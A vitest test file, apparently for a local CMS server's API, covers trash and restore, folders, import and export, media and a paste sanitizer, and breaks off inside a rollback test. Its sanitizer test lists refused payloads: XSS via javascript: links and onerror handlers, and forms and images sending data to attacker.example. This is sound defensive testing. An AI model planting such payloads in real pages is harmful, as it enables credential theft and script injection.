import { existsSync } from "node:fs";
import { createHash, randomUUID } from "node:crypto";
import { createServer } from "node:http";
import { access, chmod, mkdir, mkdtemp, readdir, readlink, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { CmsProjectCatalog, createStaticPageProfile, decodeStaticPageArchive, encodeStaticPageProfileArchive, type StaticPageProfile } from "@histos-publish/cms";
import { readFileSync } from "node:fs";
import { DatabaseSync } from "node:sqlite";
import yazl from "yazl";
import { canonicalizeJson, canonicalRevisionPayload, type JsonValue, type TransferEntity } from "@histos-publish/histos-contract";
import type { CmsBuildBundle, CmsBuildLimits, CmsDestinationInspection } from "../src/cms-api.js";
import { startLocalServer, type LocalServerHandle } from "../src/server.js";
import { CmsRemoteCatalog } from "../src/cms-remote.js";
import { fetchPrototypeAsset } from "../src/prototype-assets.js";
import type { OpenPageProbe } from "../src/prototype-verify.js";

/** A test may answer remote media itself (no network); the others get the real guarded client. */
let fakeAssetFetcher: ((url: string) => Promise<Uint8Array>) | undefined;

describe("API CMS v1", () => {
  let server: LocalServerHandle | null = null;
  let dataDirectory: string;
  let uiDirectory: string;
  let base: string;
  let destinationInspectionCalls: Array<{ projectId: string; destinationId: string }>;
  let secretValues: Map<string, string>;

  async function waitForPathRemoval(target: string, timeoutMs = 2_000): Promise<void> {
    const deadline = Date.now() + timeoutMs;
    while (Date.now() < deadline) {
      try {
        await access(target);
      } catch (error) {
        if (typeof error === "object" && error !== null && "code" in error && error.code === "ENOENT") return;
        throw error;
      }
      await new Promise((resolve) => setTimeout(resolve, 10));
    }
    throw new Error(`La directory temporanea non è stata rimossa entro ${timeoutMs} ms: ${target}`);
  }

  async function startApiServer(buildLimits?: Partial<CmsBuildLimits>, buildBundle?: CmsBuildBundle, openPageProbe?: OpenPageProbe): Promise<void> {
    server = await startLocalServer({
      ...(openPageProbe ? { openPageProbe } : {}),
      dataDirectory,
      uiDirectory,
      openBrowser: false,
      cmsPrototypeAssetFetcher: (url, maxBytes, signal) => fakeAssetFetcher ? fakeAssetFetcher(url) : fetchPrototypeAsset(url, maxBytes, signal),
      ...(buildLimits === undefined ? {} : { cmsBuildLimits: buildLimits }),
      ...(buildBundle === undefined ? {} : { cmsBuildBundle: buildBundle }),
      secretStoreFactory: (account) => ({
        get: async () => secretValues.get(account) ?? null,
        set: async (value) => { secretValues.set(account, value); },
        delete: async () => { secretValues.delete(account); },
      }),
      cmsDestinationInspection: async (input): Promise<CmsDestinationInspection> => {
        destinationInspectionCalls.push(input);
        return {
          schemaVersion: 1,
          destinationId: input.destinationId,
          label: "Sito statico verificato",
          kind: "static-hosting",
          transport: "sftp",
          checkedAt: "2026-10-25T12:00:00.000Z",
          readVerified: true,
          writeVerified: false,
          publicUrl: "https://example.test",
          detectedCapabilities: { atomicSwitch: false, rollback: false, deleteManaged: false, remoteVerify: true, runtimeProvision: false, databaseProbe: false },
          evidence: { host: "sftp.example.test", remoteDirectory: "/public", directoryEmpty: true, publicOutputChecked: false },
          findings: [],
        };
      },
    });
    base = `http://127.0.0.1:${server.port}`;
  }

  beforeEach(async () => {
    dataDirectory = await mkdtemp(path.join(os.tmpdir(), "histos-cms-api-data-"));
    uiDirectory = await mkdtemp(path.join(os.tmpdir(), "histos-cms-api-ui-"));
    await writeFile(path.join(uiDirectory, "index.html"), "<!doctype html><title>test</title>");
    destinationInspectionCalls = [];
    secretValues = new Map();
    await startApiServer();
  });

  afterEach(async () => {
    if (server) await server.close();
    // Every database the server opened must be closed by now: Windows cannot delete open files, and a leaked
    // handle is a leak on every platform. Linux shows it through /proc.
    if (process.platform === "linux") {
      const open: string[] = [];
      for (const fd of await readdir("/proc/self/fd").catch(() => [] as string[])) {
        const target = await readlink(`/proc/self/fd/${fd}`).catch(() => "");
        if (target.startsWith(dataDirectory)) open.push(target.slice(dataDirectory.length));
      }
      expect(open, "files left open after the server closed").toEqual([]);
    }
    await Promise.all([rm(dataDirectory, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }), rm(uiDirectory, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 })]);
  });

  it("elimina progetti CMS e siti nel Cestino, solo con il nome esatto; da lì si ripristinano o si eliminano definitivamente", async () => {
    const headers = { "X-Histos-Token": server!.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Da eliminare" }) });
    expect(created.status).toBe(201);
    const { project } = await created.json() as { project: { id: string } };
    // A build of the project on disk, as «Crea build» leaves it.
    const buildsFolder = path.join(dataDirectory, "histos-cms-builds", project.id);
    await mkdir(path.join(buildsFolder, crypto.randomUUID()), { recursive: true });
    await writeFile(path.join(buildsFolder, "segnaposto.html"), "<!doctype html>");
    const trash = async () => await (await fetch(`${base}/api/trash`, { headers })).json() as { retentionDays: number; projects: Array<{ id: string; name: string; deletedAt: string }>; sites: Array<{ id: string; name: string }> };

    const wrong = await fetch(`${base}/api/cms/v1/projects/${project.id}`, { method: "DELETE", headers, body: JSON.stringify({ confirmName: "da eliminare" }) });
    expect(wrong.status, "the name must be exact, case included").toBe(400);
    const trashed = await fetch(`${base}/api/cms/v1/projects/${project.id}`, { method: "DELETE", headers, body: JSON.stringify({ confirmName: " Da eliminare " }) });
    expect(trashed.status, await trashed.clone().text()).toBe(200);
    expect(await trashed.json()).toMatchObject({ trashed: true, id: project.id });
    expect((await fetch(`${base}/api/cms/v1/projects/${project.id}`, { headers })).status).toBe(404);
    expect(existsSync(buildsFolder), "its builds go at once").toBe(false);
    expect(await trash()).toMatchObject({ retentionDays: 30, projects: [{ id: project.id, name: "Da eliminare" }] });

    // A project with the same id in the way is the one conflict; once it is gone the restore works.
    const inTheWay = path.join(dataDirectory, "histos-projects", project.id);
    await mkdir(inTheWay);
    const blocked = await fetch(`${base}/api/trash/projects/${project.id}/restore`, { method: "POST", headers, body: "{}" });
    expect(blocked.status).toBe(409);
    expect(await blocked.json()).toMatchObject({ code: "trash-conflict" });
    await rm(inTheWay, { recursive: true });
    if (process.getuid?.() !== 0) {
      // A folder that cannot be written is not a conflict: it keeps its own error.
      const projectsFolder = path.join(dataDirectory, "histos-projects");
      await chmod(projectsFolder, 0o500);
      try {
        const failed = await fetch(`${base}/api/trash/projects/${project.id}/restore`, { method: "POST", headers, body: "{}" });
        expect(failed.status).not.toBe(409);
        expect(await failed.json()).not.toMatchObject({ code: "trash-conflict" });
      } finally {
        await chmod(projectsFolder, 0o700);
      }
    }

    // Restored as it was, then deleted for good from the Cestino.
    expect((await fetch(`${base}/api/trash/projects/${project.id}/restore`, { method: "POST", headers, body: "{}" })).status).toBe(200);
    expect((await fetch(`${base}/api/cms/v1/projects/${project.id}`, { headers })).status).toBe(200);
    expect((await trash()).projects).toEqual([]);
    expect((await fetch(`${base}/api/cms/v1/projects/${project.id}`, { method: "DELETE", headers, body: JSON.stringify({ confirmName: "Da eliminare" }) })).status).toBe(200);
    expect((await fetch(`${base}/api/trash/projects/${project.id}`, { method: "DELETE", headers, body: JSON.stringify({ confirmName: "Da" }) })).status).toBe(400);
    const purged = await fetch(`${base}/api/trash/projects/${project.id}`, { method: "DELETE", headers, body: JSON.stringify({ confirmName: "Da eliminare" }) });
    expect(purged.status, await purged.clone().text()).toBe(200);
    expect((await trash()).projects).toEqual([]);
    expect(existsSync(path.join(dataDirectory, "histos-projects", ".trash", project.id))).toBe(false);
    expect((await readdir(path.join(dataDirectory, "histos-projects"))).filter((name) => name.startsWith(".deleting-")), "nothing half removed").toEqual([]);

    // A site keeps its secrets in the Cestino; deleted for good, they go.
    const site = await fetch(`${base}/api/sites`, { method: "POST", headers, body: JSON.stringify({ name: "Sito da eliminare", source: { kind: "html", path: "/tmp/histos-delete-fixture.html" }, cloudflare: { script: "sito-da-eliminare" } }) });
    expect(site.status, await site.clone().text()).toBe(201);
    const { site: stored } = await site.json() as { site: { id: string } };
    secretValues.set(`wordpress-${stored.id}`, "segreto");
    secretValues.set(`hosting-${stored.id}`, "segreto");
    const refused = await fetch(`${base}/api/sites/${stored.id}`, { method: "DELETE", headers, body: JSON.stringify({ confirmName: "Sito" }) });
    expect(refused.status, await refused.clone().text()).toBe(400);
    expect((await fetch(`${base}/api/sites/${stored.id}`, { method: "DELETE", headers, body: JSON.stringify({ confirmName: "Sito da eliminare" }) })).status).toBe(200);
    const sites = async () => ((await (await fetch(`${base}/api/bootstrap`, { headers })).json()) as { sites: Array<{ id: string }> }).sites.map((item) => item.id);
    expect(await sites()).not.toContain(stored.id);
    expect((await trash()).sites.map((item) => item.id)).toEqual([stored.id]);
    expect(secretValues.has(`wordpress-${stored.id}`), "kept while in the Cestino").toBe(true);
    expect((await fetch(`${base}/api/trash/sites/${stored.id}/restore`, { method: "POST", headers, body: "{}" })).status).toBe(200);
    expect(await sites()).toContain(stored.id);
    expect((await fetch(`${base}/api/sites/${stored.id}`, { method: "DELETE", headers, body: JSON.stringify({ confirmName: "Sito da eliminare" }) })).status).toBe(200);
    expect((await fetch(`${base}/api/trash/sites/${stored.id}`, { method: "DELETE", headers, body: JSON.stringify({ confirmName: "Sito da eliminare" }) })).status).toBe(200);
    expect(secretValues.has(`wordpress-${stored.id}`)).toBe(false);
    expect(secretValues.has(`hosting-${stored.id}`)).toBe(false);
    expect((await trash()).sites).toEqual([]);
  });

  it("raggruppa i progetti CMS in cartelle; un progetto eliminato per sempre esce dalla sua cartella", async () => {
    const headers = { "X-Histos-Token": server!.token, "Content-Type": "application/json", Origin: base };
    const make = async (name: string) => ((await (await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name }) })).json()) as { project: { id: string } }).project.id;
    const first = await make("Proposta 10");
    const second = await make("Proposta 20");
    const created = await fetch(`${base}/api/folders`, { method: "POST", headers, body: JSON.stringify({ kind: "cms", name: "Versioni di Proposta" }) });
    expect(created.status, await created.clone().text()).toBe(201);
    const { folder } = await created.json() as { folder: { id: string } };
    expect((await fetch(`${base}/api/folders`, { method: "POST", headers, body: JSON.stringify({ kind: "cms", name: "" }) })).status).toBe(400);
    expect((await fetch(`${base}/api/folders/move`, { method: "POST", headers, body: JSON.stringify({ kind: "cms", ids: [first, crypto.randomUUID()], folderId: folder.id }) })).status, "every id must exist").toBe(400);
    expect((await fetch(`${base}/api/folders/move`, { method: "POST", headers, body: JSON.stringify({ kind: "cms", ids: [first, second], folderId: folder.id }) })).status).toBe(200);
    expect((await fetch(`${base}/api/folders/${folder.id}`, { method: "PATCH", headers, body: JSON.stringify({ name: "Proposte" }) })).status).toBe(200);
    const read = async () => await (await fetch(`${base}/api/folders`, { headers })).json() as { folders: Array<{ id: string; name: string }>; members: { cms: Record<string, string> } };
    expect(await read()).toMatchObject({ folders: [{ id: folder.id, name: "Proposte" }], members: { cms: { [first]: folder.id, [second]: folder.id } } });

    // In the Cestino it keeps its folder; deleted for good, it leaves it.
    expect((await fetch(`${base}/api/cms/v1/projects/${second}`, { method: "DELETE", headers, body: JSON.stringify({ confirmName: "Proposta 20" }) })).status).toBe(200);
    expect((await read()).members.cms[second]).toBe(folder.id);
    expect((await fetch(`${base}/api/trash/projects/${second}`, { method: "DELETE", headers, body: JSON.stringify({ confirmName: "Proposta 20" }) })).status).toBe(200);
    expect((await read()).members.cms).toEqual({ [first]: folder.id });

    expect((await fetch(`${base}/api/folders/${folder.id}`, { method: "DELETE", headers })).status).toBe(200);
    expect(await read()).toMatchObject({ folders: [], members: { cms: {} } });
    expect((await fetch(`${base}/api/cms/v1/projects/${first}`, { headers })).status, "the project stays").toBe(200);
    expect((await fetch(`${base}/api/folders/${folder.id}`, { method: "DELETE", headers })).status).toBe(404);
  });

  it("espone bootstrap e BuilderConfig sotto il prefisso versionato", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const unauthenticated = await fetch(`${base}/api/cms/v1/projects`);
    expect(unauthenticated.status).toBe(401);
    expect(await unauthenticated.json()).toMatchObject({ code: "auth-required" });
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Sito di prova" }) });
    expect(created.status).toBe(201);
    const { project } = await created.json() as { project: { id: string } };

    const bootstrap = await fetch(`${base}/api/cms/v1/projects/${project.id}/bootstrap`, { headers });
    expect(bootstrap.status, await bootstrap.clone().text()).toBe(200);
    const bootstrapData = await bootstrap.json() as { revision: string; [key: string]: unknown };
    expect(bootstrapData.revision).toMatch(/^[a-f0-9]{64}$/);
    const initialProjectRevision = bootstrapData.revision;
    const repeatedBootstrap = await fetch(`${base}/api/cms/v1/projects/${project.id}/bootstrap`, { headers });
    expect((await repeatedBootstrap.json() as { revision: string }).revision).toBe(initialProjectRevision);
    expect(bootstrapData).toMatchObject({
      apiVersion: 1,
      projectId: project.id,
      engine: { runtime: "histos-ts" },
      capabilities: {
        documents: ["page", "component", "template", "template-part"], templates: true, templateParts: true,
        blocks: ["xb/element", "xb/text", "xb/if", "xb/branch", "xb/loop", "xb/component", "xb/slot", "xb/slot-fill", "xb/raw", "xb/passthrough", "xb/post-content"],
        components: { definitions: true, literalProps: true, dynamicProps: true, namedSlots: true, emptySlotMetadata: true, transfer: false },
        expressions: { status: "partial", arbitrary: false, modifiers: true, modifierNames: ["upper", "lower", "capitalize", "trim", "inline", "stripTags", "truncateWords", "truncateChars", "date", "number", "length", "first", "last", "join", "slice", "includes", "pluck", "groupBy", "default", "json", "slug"], customModifiers: false, loops: true, queryPresets: true },
        runtimeLimits: { componentDepth: 16, blockDepth: 64, loopDepth: 6, loopItems: 1_000, renderedNodes: 50_000, workBytes: 33_554_432, htmlBytes: 33_554_432 },
        forms: { staticEndpoints: true, methods: ["get", "post"], actionSchemes: ["https", "same-origin-relative"], buildRequiresActionAndMethod: true, previewSubmissions: false },
        queries: true, contentTypes: true, relations: true,
        transfer: { available: false, read: [], write: [], profile: null },
        design: { compiledCss: true, parameterGenerator: true, tokenOverrides: true, contrast: true },
      },
    });

    const connections = await fetch(`${base}/api/cms/v1/connections`, { headers });
    expect(connections.status).toBe(200);
    expect(await connections.json()).toEqual({ connections: [] });
    const badPairing = await fetch(`${base}/api/cms/v1/connections`, { method: "POST", headers, body: JSON.stringify({ code: "invalid" }) });
    expect(badPairing.status).toBe(400);
    expect(await badPairing.json()).toMatchObject({ code: "cms-remote-code-invalid" });
    const badConnectionId = await fetch(`${base}/api/cms/v1/connections`, {
      method: "POST", headers, body: JSON.stringify({ code: "histos-cms-1:invalid", connectionId: "not-a-uuid" }),
    });
    expect(badConnectionId.status).toBe(400);
    expect(await badConnectionId.json()).toMatchObject({ code: "cms-remote-connection-id-invalid" });

    const builder = await fetch(`${base}/api/cms/v1/projects/${project.id}/builder-config?document=1`, { headers });
    expect(builder.status).toBe(200);
    expect(await builder.json()).toMatchObject({
      restUrl: `/api/cms/v1/projects/${project.id}/`, localCms: true, previewable: true,
      cmsMediaBase: `/__cms-media/${project.id}`,
      media: { url: `/api/cms/v1/projects/${project.id}/media` },
    });

    const exported = await fetch(`${base}/api/cms/v1/projects/${project.id}/export`, { method: "POST", headers });
    expect(exported.status).toBe(200);
    expect(exported.headers.get("content-type")).toBe("application/zip");
    expect(exported.headers.get("content-disposition")).toContain(".xbsite");
    const archive = await exported.arrayBuffer();
    const duplicateImport = await fetch(`${base}/api/cms/v1/projects/import`, { method: "POST", headers: { ...headers, "Content-Type": "application/zip" }, body: archive });
    expect(duplicateImport.status).toBe(409);
    expect(await duplicateImport.json()).toMatchObject({ code: "cms-project-duplicate" });
    const afterDuplicateImport = await fetch(`${base}/api/cms/v1/projects/${project.id}/bootstrap`, { headers });
    expect((await afterDuplicateImport.json() as { revision: string }).revision).toBe(initialProjectRevision);
    const rejectedImport = await fetch(`${base}/api/cms/v1/projects/import`, { method: "POST", headers: { ...headers, "Content-Type": "application/zip" }, body: Buffer.from("not a zip archive") });
    expect(rejectedImport.status).toBe(422);
    expect(await rejectedImport.json()).toMatchObject({ code: "cms-archive-invalid", error: "Il file non è un archivio ZIP leggibile: forse è incompleto o danneggiato." });
    const projectsAfterRejectedImport = await fetch(`${base}/api/cms/v1/projects`, { headers });
    expect((await projectsAfterRejectedImport.json() as { projects: Array<{ id: string }> }).projects.map(({ id }) => id)).toEqual([project.id]);

    const backup = await fetch(`${base}/api/cms/v1/projects/${project.id}/backup`, { method: "POST", headers });
    expect(backup.status).toBe(200);
    expect(backup.headers.get("content-type")).toBe("application/zip");
    expect(backup.headers.get("content-disposition")).toContain(".histosproject");
    const nativeArchive = await backup.arrayBuffer();
    const duplicateRestore = await fetch(`${base}/api/cms/v1/projects/restore`, { method: "POST", headers: { ...headers, "Content-Type": "application/zip" }, body: nativeArchive });
    expect(duplicateRestore.status).toBe(409);
    expect(await duplicateRestore.json()).toMatchObject({ code: "cms-project-duplicate" });
    const afterDuplicateRestore = await fetch(`${base}/api/cms/v1/projects/${project.id}/bootstrap`, { headers });
    expect((await afterDuplicateRestore.json() as { revision: string }).revision).toBe(initialProjectRevision);
    const rejectedBackup = await fetch(`${base}/api/cms/v1/projects/restore`, { method: "POST", headers: { ...headers, "Content-Type": "application/zip" }, body: Buffer.from("not a backup archive") });
    expect(rejectedBackup.status).toBe(422);
    expect(await rejectedBackup.json()).toMatchObject({ code: "cms-archive-invalid" });
    const projectsAfterRejectedBackup = await fetch(`${base}/api/cms/v1/projects`, { headers });
    expect((await projectsAfterRejectedBackup.json() as { projects: Array<{ id: string }> }).projects.map(({ id }) => id)).toEqual([project.id]);

    const framework = await fetch(`${base}/api/cms/v1/projects/${project.id}/framework`, { headers });
    expect(framework.status).toBe(200);
    expect(await framework.json()).toMatchObject({ active: { id: "xb-tokens", label: "Histeon CSS" } });

    const createdComponent = await fetch(`${base}/api/cms/v1/projects/${project.id}/components`, {
      method: "POST",
      headers,
      body: JSON.stringify({
        ref: "ui/card",
        title: "Card",
        content: '<!-- wp:xb/element {"uid":"abcde12346","tag":"h2"} --><!-- wp:xb/text {"uid":"abcde12347","content":"{props.title}"} /--><!-- /wp:xb/element -->',
        schema: { props: { title: { type: "string", default: "Titolo" } } },
      }),
    });
    expect(createdComponent.status).toBe(201);
    const component = await createdComponent.json() as { id: number; ref: string; head: string; content: string };
    const bootstrapAfterComponent = await fetch(`${base}/api/cms/v1/projects/${project.id}/bootstrap`, { headers });
    expect((await bootstrapAfterComponent.json() as { revision: string }).revision).not.toBe(initialProjectRevision);
    expect(component).toMatchObject({ ref: "ui/card", content: expect.stringContaining("props.title") });
    const componentBuilder = await fetch(`${base}/api/cms/v1/projects/${project.id}/builder-config?document=${component.id}`, { headers });
    expect(componentBuilder.status).toBe(200);
    expect(await componentBuilder.json()).toMatchObject({ localCms: true, previewable: false });
    const components = await fetch(`${base}/api/cms/v1/projects/${project.id}/components`, { headers });
    expect(await components.json()).toEqual([{ id: component.id, ref: "ui/card", title: "Card", props: { title: { type: "string", default: "Titolo" } } }]);
    const firstSave = await fetch(`${base}/api/cms/v1/projects/${project.id}/documents/${component.id}`, {
      method: "POST", headers,
      body: JSON.stringify({ head: component.head, content: component.content + '<!-- wp:xb/text {"uid":"abcde12349","content":"Saved"} /-->', ref: component.ref, schema: { props: { title: { type: "string", default: "Titolo" } } } }),
    });
    expect(firstSave.status).toBe(200);
    const updatedComponent = await firstSave.json() as { id: number; head: string; content: string };
    const staleSave = await fetch(`${base}/api/cms/v1/projects/${project.id}/documents/${component.id}`, {
      method: "POST", headers,
      body: JSON.stringify({ head: component.head, content: component.content + '<!-- wp:xb/text {"uid":"abcde12350","content":"Branch"} /-->', ref: component.ref, schema: { props: { title: { type: "string", default: "Titolo" } } } }),
    });
    expect(staleSave.status).toBe(409);
    expect(await staleSave.json()).toMatchObject({ code: "cms-revision-conflict", current: { head: updatedComponent.head } });
    const rendered = await fetch(`${base}/api/cms/v1/projects/${project.id}/render`, {
      method: "POST", headers,
      body: JSON.stringify({ post_id: 1, content: '<!-- wp:xb/component {"uid":"abcde12348","ref":"ui/card","props":{"title":"Dal componente"}} /-->' }),
    });
    const renderedBody = await rendered.json() as { html?: string; error?: string };
    expect(rendered.status, JSON.stringify(renderedBody)).toBe(200);
    // The canvas render marks every element with its block's uid, what the editor selects on click.
    expect(renderedBody.html).toContain('<h2 data-xb-uid="');
    expect(renderedBody.html?.replace(/ data-xb-uid="[^"]*"/gu, "")).toContain("<h2>Dal componente</h2>");

    const partialExport = await fetch(`${base}/api/cms/v1/projects/${project.id}/export`, { method: "POST", headers });
    expect(partialExport.status).toBe(200);
    expect(partialExport.headers.get("content-disposition")).toContain(".xbsite");

    const unversioned = await fetch(`${base}/api/cms/projects`, { headers });
    expect(unversioned.status).toBe(404);
  });

  it("la libreria dei media dell'editor elenca le immagini, e i PDF quando li chiede chi sceglie un file da collegare (doc 23, voce 176)", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Link ai file" }) });
    const { project } = await created.json() as { project: { id: string } };
    const prefix = `${base}/api/cms/v1/projects/${project.id}`;
    const png = await fetch(`${prefix}/media?filename=foto.png`, { method: "POST", headers: { ...headers, "Content-Type": "image/png" }, body: Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]) });
    const pdf = await fetch(`${prefix}/media?filename=listino.pdf`, { method: "POST", headers: { ...headers, "Content-Type": "application/pdf" }, body: Buffer.from("%PDF-1.4\n%%EOF\n") });
    expect([png.status, pdf.status]).toEqual([201, 201]);
    const pdfId = (await pdf.json() as { asset_id: string }).asset_id;
    const list = async (query = "") => (await (await fetch(`${prefix}/media${query}`, { headers })).json() as Array<{ source_url: string; mime_type: string; title: { rendered: string } }>);
    expect((await list()).map((item) => item.mime_type)).toEqual(["image/png"]);
    expect(await list("?mime_type=application%2Fpdf")).toEqual([expect.objectContaining({ mime_type: "application/pdf", source_url: `/__cms-media/${project.id}/${pdfId}`, title: { rendered: "listino.pdf" } })]);
    expect((await list("?mime_type=application%2Fpdf&search=foto"))).toEqual([]);
  });

  it("controlla ciò che si incolla da fuori nel builder locale come un trasferimento del progetto: lo prende intero o lo rifiuta (paste/sanitize)", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Incolla" }) });
    const { project } = await created.json() as { project: { id: string } };
    const prefix = `${base}/api/cms/v1/projects/${project.id}`;
    const upload = await fetch(`${prefix}/media?filename=foto.png`, { method: "POST", headers: { ...headers, "Content-Type": "image/png" }, body: Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]) });
    expect(upload.status).toBe(201);
    const photo = (await upload.json() as { asset_id: string }).asset_id;
    const paste = (body: unknown) => fetch(`${prefix}/paste/sanitize`, { method: "POST", headers, body: JSON.stringify(body) });
    const el = (attributes: Record<string, unknown>, inner = "") => inner ? `<!-- wp:xb/element ${JSON.stringify({ uid: "abcde12399", ...attributes })} -->${inner}<!-- /wp:xb/element -->` : `<!-- wp:xb/element ${JSON.stringify({ uid: "abcde12398", ...attributes })} /-->`;
    const text = (content: string, uid = "abcde12397") => `<!-- wp:xb/text ${JSON.stringify({ uid, content })} /-->`;
    const loop = (inner: string) => `<!-- wp:xb/loop {"uid":"abcde12390","source":{"kind":"expr","expr":"page.items"},"as":"voce"} -->${inner}<!-- /wp:xb/loop -->`;
    const branch = (inner: string, uid: string, test?: string) => `<!-- wp:xb/branch ${JSON.stringify({ uid, ...(test === undefined ? {} : { test }) })} -->${inner}<!-- /wp:xb/branch -->`;

    // Taken whole: transferable markup, this project's media, a whole data path in an address, a loop with {:else}.
    const accepted = [
      el({ tag: "section" }, text("Ciao <strong>tutti</strong>")),
      el({ tag: "img", attributes: { src: `/__cms-media/${project.id}/${photo}`, alt: "" } }),
      el({ tag: "img", attributes: { src: `histos-media://${photo}`, alt: "" } }),
      el({ tag: "img", attributes: { src: "{props.immagine}", alt: "" } }),
      loop(el({ tag: "a", attributes: { href: "{voce.url}" } }, text("{voce.title}", "abcde12396")) + branch(text("Nessuna voce", "abcde12395"), "abcde12394")),
      el({ tag: "form", attributes: { action: "/cerca/", method: "get" } }, el({ tag: "input", attributes: { type: "search", name: "q" } })),
    ];
    for (const content of accepted) {
      const response = await paste({ content, styles: [{ selector: ".card", css: "color: red; & h2 { margin: 0 }" }] });
      expect(response.status, content).toBe(200);
      expect(await response.json()).toEqual({ content, styles: [{ selector: ".card", css: "color: red; & h2 { margin: 0 }" }] });
    }

    // Refused with the first reason, 422: every way the review found to get past the old check, and the usual ones.
    const refused: Record<string, string> = {
      raw: '<!-- wp:xb/raw {"uid":"abcde12301","content":"<form action=\\"https://attacker.example/c\\" method=\\"post\\"><input type=\\"password\\" name=\\"p\\"></form>"} /-->',
      passthrough: "<!-- wp:core/html --><img src=https://attacker.example/p.gif><!-- /wp:core/html -->",
      unknownXb: '<!-- wp:xb/evil {"uid":"abcde12301","content":"<script>"} /-->',
      postContent: '<!-- wp:xb/post-content {"uid":"abcde12301"} /-->',
      freeform: "<script>alert(1)</script>",
      freeformBetween: `${text("x")}<img src=x onerror=alert(1)>`,
      imgExternal: el({ tag: "img", attributes: { src: "https://attacker.example/t.gif", alt: "" } }),
      imgJavascript: el({ tag: "img", attributes: { src: "javascript:alert(1)", alt: "" } }),
      imgData: el({ tag: "img", attributes: { src: "data:image/svg+xml,%3Csvg%3E", alt: "" } }),
      imgOtherProject: el({ tag: "img", attributes: { src: `/__cms-media/12345678-1234-4234-8234-123456789abc/${photo}`, alt: "" } }),
      imgUnknownAsset: el({ tag: "img", attributes: { src: "histos-media://e5555555-5555-4555-8555-555555555555", alt: "" } }),
      imgPageExpression: el({ tag: "img", attributes: { src: "{page.title}", alt: "" } }),
      srcsetExternal: el({ tag: "img", attributes: { src: `/__cms-media/${project.id}/${photo}`, srcset: "https://attacker.example/a.png 2x", alt: "" } }),
      hrefLiteral: el({ tag: "a", attributes: { href: "{'javascript:alert(1)'}" } }),
      hrefSplit: el({ tag: "a", attributes: { href: "java{''}script:alert(1)" } }),
      hrefModifier: el({ tag: "a", attributes: { href: "{voce.url.default('javascript:alert(1)')}" } }),
      hrefAround: el({ tag: "a", attributes: { href: "https://x.example/{page.slug}" } }),
      hrefJavascript: el({ tag: "a", attributes: { href: "javascript&colon;alert(1)" } }),
      formExternal: el({ tag: "form", attributes: { action: "https://attacker.example/collect", method: "post" } }, el({ tag: "input", attributes: { type: "email", name: "e" } })),
      formProtocolRelative: el({ tag: "form", attributes: { action: "//attacker.example/collect", method: "post" } }),
      formBackslash: el({ tag: "form", attributes: { action: "/\\attacker.example/collect", method: "post" } }),
      formTabbedScheme: el({ tag: "form", attributes: { action: "ht\ttps://attacker.example/collect", method: "post" } }),
      password: el({ tag: "input", attributes: { type: "password", name: "p" } }),
      handler: el({ tag: "div", attributes: { onclick: "alert(1)" } }),
      script: el({ tag: "script" }),
      upperTag: el({ tag: "DIV" }),
      twoElse: loop(text("x") + branch("", "abcde12381") + branch("", "abcde12382")),
      elseNotLast: loop(branch(text("e", "abcde12383"), "abcde12384") + text("x")),
      branchWithTest: loop(text("x") + branch("", "abcde12385", "page.ok")),
      elseOutsideLoop: el({ tag: "div" }, branch(text("e", "abcde12386"), "abcde12387")),
      loopVariableInElse: loop(text("x") + branch(text("{voce.title}", "abcde12388"), "abcde12389")),
      unknownComponent: '<!-- wp:xb/component {"uid":"abcde12301","ref":"ui/altrove"} /-->',
      unknownQuery: '<!-- wp:xb/loop {"uid":"abcde12301","source":{"kind":"preset","id":"inventata"},"as":"x"} --><!-- /wp:xb/loop -->',
    };
    for (const [name, content] of Object.entries(refused)) {
      const response = await paste({ content, styles: [] });
      expect(response.status, name).toBe(422);
      expect(await response.json(), name).toMatchObject({ code: "cms-paste-markup" });
    }
    for (const css of ["background: url(https://example.test/x.png)", "@import 'x.css'", "color: red /* x */", "background: \\75 rl(x)"]) {
      const loading = await paste({ content: accepted[0], styles: [{ selector: ".card", css }] });
      expect(loading.status, css).toBe(422);
      expect(await loading.json()).toMatchObject({ code: "cms-paste-styles" });
    }
    expect((await paste({ content: 7 })).status).toBe(400);
    expect((await paste({ content: accepted[0], styles: [{ selector: ".a" }] })).status).toBe(400);
    // Past 128 KiB the content is refused before it is read (the block grammar is quadratic on unclosed delimiters).
    const large = await paste({ content: "<!-- wp:xb/element {".repeat(7000) });
    expect(large.status).toBe(413);
    expect(await large.json()).toMatchObject({ code: "cms-paste-too-large" });
    const worst = "<!-- wp:xb/element {".repeat(Math.floor(128 * 1024 / 20));
    const started = Date.now();
    expect((await paste({ content: worst })).status).toBe(422);
    expect(Date.now() - started).toBeLessThan(3_000);
  });

  it("richiede conferma esplicita prima di avviare il ripristino di un invio WordPress", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const catalog = new CmsRemoteCatalog(dataDirectory);
    const connectionId = randomUUID();
    catalog.add({
      id: connectionId,
      url: "https://wordpress.example.test",
      siteId: randomUUID(),
      projectId: randomUUID(),
      projectName: "WordPress di prova",
      profile: "histos-static-project-v3",
      read: true,
      write: true,
      publish: true,
    });
    const headers = { "X-Histos-Token": server.token, Origin: base, "Content-Type": "application/json" };
    try {
      const unconfirmed = await fetch(`${base}/api/cms/v1/connections/${connectionId}/operations/${randomUUID()}/rollback`, {
        method: "POST", headers, body: JSON.stringify({ confirmed: false }),
      });
      expect(unconfirmed.status).toBe(428);
      expect(await unconfirmed.json()).toMatchObject({ code: "confirmation-required" });

